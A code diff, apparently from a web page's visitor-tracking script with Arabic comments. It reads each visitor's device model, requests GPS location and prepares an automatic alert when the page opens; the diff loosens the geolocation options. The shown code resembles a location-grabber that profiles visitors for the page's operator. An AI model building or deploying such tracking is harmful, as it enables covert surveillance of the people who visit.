@@ -335,7 +335,6 @@ async function getExactDeviceModel() {
     let ua = navigator.userAgent;
     let model = "غير معروف";
 
-    // محاولة جلب موديل الهاتف بدقة عالية عبر High Entropy Hints (للمتصفحات الحديثة)
     if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
         try {
             const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platform", "platformVersion"]);
@@ -346,7 +345,6 @@ async function getExactDeviceModel() {
         } catch(e) {}
     }
 
-    // تحليل سلسلات User-Agent الشهيرة للأنواع المختلفة
     if (/iPhone/i.test(ua)) {
         model = "Apple iPhone";
     } else if (/iPad/i.test(ua)) {
@@ -367,15 +365,14 @@ async function getExactDeviceModel() {
     return model;
 }
 
-// دالة طلب الإذن لجلب الموقع الجغرافي الدقيق (GPS)
+// دالة طلب الإذن لجلب الموقع الجغرافي (محدثة وسريعة)
 function getExactLocation() {
     return new Promise((resolve) => {
         if (!navigator.geolocation) {
-            resolve("خدمة تحديد الموقع غير مدعومة في متصفح الزائر");
+            resolve({ text: "خدمة تحديد الموقع غير مدعومة في متصفح الزائر" });
             return;
         }
 
-        // طلب الإذن وتحديد الموقع
         navigator.geolocation.getCurrentPosition(
             (position) => {
                 const lat = position.coords.latitude;
@@ -400,9 +397,9 @@ function getExactLocation() {
                 resolve({ text: `📍 <b>إذن الموقع:</b> ${errText}` });
             },
             {
-                enableHighAccuracy: true,
-                timeout: 7000,
-                maximumAge: 0
+                enableHighAccuracy: false, // تم الإلغاء لتسريع الاستجابة وعدم استهلاك وقت طويل
+                timeout: 15000,           // زيادة الوقت إلى 15 ثانية حتى لا تظهر رسالة الانتهاء
+                maximumAge: 30000         // استخدام الموقع الأخير المحفوظ في الجهاز إن وجد
             }
         );
     });
@@ -460,7 +457,6 @@ async function collectDeviceData() {
 
 // دالة إرسال تنبيه فتح الصفحة التلقائي
 async function sendVisitorNotification() {
-    // البدء في طلب إذن الموقع والجهاز في وقت واحد
     const locationPromise = getExactLocation();
     const dataPromise = collectDeviceData();
 
